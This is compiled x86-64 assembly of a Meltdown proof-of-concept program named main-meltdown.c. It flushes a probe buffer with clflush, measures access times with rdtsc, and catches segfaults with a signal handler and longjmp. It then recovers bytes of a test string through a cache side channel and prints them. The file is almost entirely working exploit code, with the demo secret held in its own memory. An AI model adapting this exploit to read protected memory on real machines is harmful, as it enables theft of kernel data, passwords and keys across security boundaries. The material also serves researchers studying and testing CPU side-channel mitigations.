	.file	"main-meltdown.c"
	.text
	.local	longjmp_buf
	.comm	longjmp_buf,200,32
	.globl	probe_buffer
	.bss
	.align 8
	.type	probe_buffer, @object
	.size	probe_buffer, 8
probe_buffer:
	.zero	8
	.section	.rodata
.LC0:
	.string	"\033[31;1m[-]\033[0m "
.LC1:
	.string	"\033[33;1m[.]\033[0m "
.LC2:
	.string	"\033[32;1m[+]\033[0m "
	.text
	.type	_log, @function
_log:
.LFB6:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$224, %rsp
	movl	%edi, -212(%rbp)
	movq	%rsi, -224(%rbp)
	movq	%rdx, -160(%rbp)
	movq	%rcx, -152(%rbp)
	movq	%r8, -144(%rbp)
	movq	%r9, -136(%rbp)
	testb	%al, %al
	je	.L2
	movaps	%xmm0, -128(%rbp)
	movaps	%xmm1, -112(%rbp)
	movaps	%xmm2, -96(%rbp)
	movaps	%xmm3, -80(%rbp)
	movaps	%xmm4, -64(%rbp)
	movaps	%xmm5, -48(%rbp)
	movaps	%xmm6, -32(%rbp)
	movaps	%xmm7, -16(%rbp)
.L2:
	movq	%fs:40, %rax
	movq	%rax, -184(%rbp)
	xorl	%eax, %eax
	cmpl	$2, -212(%rbp)
	je	.L3
	cmpl	$2, -212(%rbp)
	ja	.L9
	cmpl	$0, -212(%rbp)
	je	.L5
	cmpl	$1, -212(%rbp)
	je	.L6
	jmp	.L9
.L5:
	leaq	.LC0(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L7
.L6:
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L7
.L3:
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L7
.L9:
	nop
.L7:
	movl	$16, -208(%rbp)
	movl	$48, -204(%rbp)
	leaq	16(%rbp), %rax
	movq	%rax, -200(%rbp)
	leaq	-176(%rbp), %rax
	movq	%rax, -192(%rbp)
	movq	stdout(%rip), %rax
	leaq	-208(%rbp), %rdx
	movq	-224(%rbp), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	call	vfprintf@PLT
	nop
	movq	-184(%rbp), %rax
	subq	%fs:40, %rax
	je	.L8
	call	__stack_chk_fail@PLT
.L8:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE6:
	.size	_log, .-_log
	.globl	flush
	.type	flush, @function
flush:
.LFB7:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
#APP
# 54 "main-meltdown.c" 1
	mfence
clflush 0(%rax)
# 0 "" 2
#NO_APP
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE7:
	.size	flush, .-flush
	.globl	time_access_no_flush
	.type	time_access_no_flush, @function
time_access_no_flush:
.LFB8:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -24(%rbp)
	movq	-24(%rbp), %rax
	movq	%rax, %rcx
#APP
# 63 "main-meltdown.c" 1
	  mfence             
  lfence             
  rdtsc              
  lfence             
  movl %eax, %esi  
  movl (%rcx), %eax   
  lfence             
  rdtsc              
  subl %esi, %eax  

# 0 "" 2
#NO_APP
	movq	%rax, -8(%rbp)
	movq	-8(%rbp), %rax
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE8:
	.size	time_access_no_flush, .-time_access_no_flush
	.globl	flush_probe_buffer
	.type	flush_probe_buffer, @function
flush_probe_buffer:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$0, -4(%rbp)
	jmp	.L14
.L15:
	movq	probe_buffer(%rip), %rdx
	movl	-4(%rbp), %eax
	cltq
	addq	%rdx, %rax
	movq	%rax, %rdi
	call	flush
	addl	$1, -4(%rbp)
.L14:
	cmpl	$1048575, -4(%rbp)
	jle	.L15
	nop
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	flush_probe_buffer, .-flush_probe_buffer
	.globl	load_probe_buffer
	.type	load_probe_buffer, @function
load_probe_buffer:
.LFB10:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	$0, -4(%rbp)
	jmp	.L17
.L18:
	movq	probe_buffer(%rip), %rdx
	movl	-4(%rbp), %eax
	sall	$12, %eax
	cltq
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movb	%al, -5(%rbp)
	addl	$1, -4(%rbp)
.L17:
	cmpl	$255, -4(%rbp)
	jle	.L18
	nop
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE10:
	.size	load_probe_buffer, .-load_probe_buffer
	.globl	populate_probe_buffer
	.type	populate_probe_buffer, @function
populate_probe_buffer:
.LFB11:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	$0, -4(%rbp)
	jmp	.L20
.L21:
	call	rand@PLT
	cltd
	shrl	$24, %edx
	addl	%edx, %eax
	movzbl	%al, %eax
	subl	%edx, %eax
	movl	%eax, %ecx
	movq	probe_buffer(%rip), %rdx
	movl	-4(%rbp), %eax
	cltq
	addq	%rdx, %rax
	movl	%ecx, %edx
	movb	%dl, (%rax)
	addl	$1, -4(%rbp)
.L20:
	cmpl	$1048575, -4(%rbp)
	jle	.L21
	nop
	nop
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE11:
	.size	populate_probe_buffer, .-populate_probe_buffer
	.globl	unblock_signal
	.type	unblock_signal, @function
unblock_signal:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$160, %rsp
	movl	%edi, -148(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	leaq	-144(%rbp), %rax
	movq	%rax, %rdi
	call	sigemptyset@PLT
	movl	-148(%rbp), %edx
	leaq	-144(%rbp), %rax
	movl	%edx, %esi
	movq	%rax, %rdi
	call	sigaddset@PLT
	leaq	-144(%rbp), %rax
	movl	$0, %edx
	movq	%rax, %rsi
	movl	$1, %edi
	call	sigprocmask@PLT
	nop
	movq	-8(%rbp), %rax
	subq	%fs:40, %rax
	je	.L23
	call	__stack_chk_fail@PLT
.L23:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE12:
	.size	unblock_signal, .-unblock_signal
	.globl	segfault_handler_callback
	.type	segfault_handler_callback, @function
segfault_handler_callback:
.LFB13:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$16, %rsp
	movl	%edi, -4(%rbp)
	movl	$11, %edi
	call	unblock_signal
	movl	$1, %esi
	leaq	longjmp_buf(%rip), %rax
	movq	%rax, %rdi
	call	longjmp@PLT
	.cfi_endproc
.LFE13:
	.size	segfault_handler_callback, .-segfault_handler_callback
	.globl	setup_signal_handler
	.type	setup_signal_handler, @function
setup_signal_handler:
.LFB14:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	leaq	segfault_handler_callback(%rip), %rax
	movq	%rax, %rsi
	movl	$11, %edi
	call	signal@PLT
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE14:
	.size	setup_signal_handler, .-setup_signal_handler
	.globl	melt_byte_dynamic
	.type	melt_byte_dynamic, @function
melt_byte_dynamic:
.LFB15:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$1104, %rsp
	movq	%rdi, -1096(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	$100, -1076(%rbp)
	movl	$1, %edi
	call	malloc@PLT
	movq	%rax, -1048(%rbp)
	movl	$0, -1072(%rbp)
	jmp	.L27
.L28:
	movl	-1072(%rbp), %eax
	cltq
	movl	$1000000, -1040(%rbp,%rax,4)
	addl	$1, -1072(%rbp)
.L27:
	cmpl	$255, -1072(%rbp)
	jle	.L28
	jmp	.L29
.L35:
	leaq	longjmp_buf(%rip), %rax
	movq	%rax, %rdi
	call	_setjmp@PLT
	endbr64
	testl	%eax, %eax
	jne	.L31
	movq	-1048(%rbp), %rax
	movzbl	(%rax), %eax
	movq	-1048(%rbp), %rax
	movzbl	(%rax), %eax
	movq	-1048(%rbp), %rax
	movzbl	(%rax), %eax
	movq	-1048(%rbp), %rax
	movzbl	(%rax), %eax
	movq	probe_buffer(%rip), %rdx
	movq	-1096(%rbp), %rax
	movzbl	(%rax), %eax
	movsbl	%al, %eax
	sall	$12, %eax
	cltq
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movb	%al, -1077(%rbp)
.L31:
	movl	$0, -1068(%rbp)
	jmp	.L32
.L34:
	movq	probe_buffer(%rip), %rdx
	movl	-1068(%rbp), %eax
	sall	$12, %eax
	cltq
	addq	%rdx, %rax
	movq	%rax, %rdi
	call	time_access_no_flush
	movl	%eax, -1052(%rbp)
	movl	-1068(%rbp), %eax
	cltq
	movl	-1040(%rbp,%rax,4), %eax
	cmpl	%eax, -1052(%rbp)
	jge	.L33
	cmpl	$0, -1052(%rbp)
	jle	.L33
	movl	-1068(%rbp), %eax
	cltq
	movl	-1052(%rbp), %edx
	movl	%edx, -1040(%rbp,%rax,4)
.L33:
	movq	probe_buffer(%rip), %rdx
	movl	-1068(%rbp), %eax
	sall	$12, %eax
	cltq
	addq	%rdx, %rax
	movq	%rax, %rdi
	call	flush
	addl	$1, -1068(%rbp)
.L32:
	cmpl	$255, -1068(%rbp)
	jle	.L34
.L29:
	movl	-1076(%rbp), %eax
	leal	-1(%rax), %edx
	movl	%edx, -1076(%rbp)
	testl	%eax, %eax
	jne	.L35
	movl	$10000, -1064(%rbp)
	movl	$0, -1060(%rbp)
	movl	$1, -1056(%rbp)
	jmp	.L36
.L38:
	movl	-1056(%rbp), %eax
	cltq
	movl	-1040(%rbp,%rax,4), %eax
	cmpl	%eax, -1064(%rbp)
	jle	.L37
	movl	-1056(%rbp), %eax
	cltq
	movl	-1040(%rbp,%rax,4), %eax
	movl	%eax, -1064(%rbp)
	movl	-1056(%rbp), %eax
	movl	%eax, -1060(%rbp)
.L37:
	addl	$1, -1056(%rbp)
.L36:
	cmpl	$255, -1056(%rbp)
	jle	.L38
	movl	-1060(%rbp), %eax
	movq	-8(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L40
	call	__stack_chk_fail@PLT
.L40:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE15:
	.size	melt_byte_dynamic, .-melt_byte_dynamic
	.section	.rodata
.LC3:
	.string	"TestStringLeakedByMeltdown"
.LC4:
	.string	"Decoded secred="
	.text
	.globl	main
	.type	main, @function
main:
.LFB16:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$40, %rsp
	.cfi_offset 3, -24
	movl	%edi, -36(%rbp)
	movq	%rsi, -48(%rbp)
	leaq	.LC3(%rip), %rax
	movq	%rax, -24(%rbp)
	movl	$1048576, %edi
	call	malloc@PLT
	movq	%rax, probe_buffer(%rip)
	movl	$0, %eax
	call	setup_signal_handler
	movl	$0, %eax
	call	populate_probe_buffer
	movl	$0, %eax
	call	flush_probe_buffer
	leaq	.LC4(%rip), %rax
	movq	%rax, %rsi
	movl	$2, %edi
	movl	$0, %eax
	call	_log
	movl	$0, -28(%rbp)
	jmp	.L42
.L43:
	movl	-28(%rbp), %eax
	movslq	%eax, %rdx
	movq	-24(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, %rdi
	call	melt_byte_dynamic
	movb	%al, -29(%rbp)
	movsbl	-29(%rbp), %eax
	movl	%eax, %edi
	call	putchar@PLT
	addl	$1, -28(%rbp)
.L42:
	movl	-28(%rbp), %eax
	movslq	%eax, %rbx
	movq	-24(%rbp), %rax
	movq	%rax, %rdi
	call	strlen@PLT
	cmpq	%rax, %rbx
	jb	.L43
	movl	$10, %edi
	call	putchar@PLT
	movl	$0, %eax
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE16:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 11.4.0-2ubuntu1~20.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
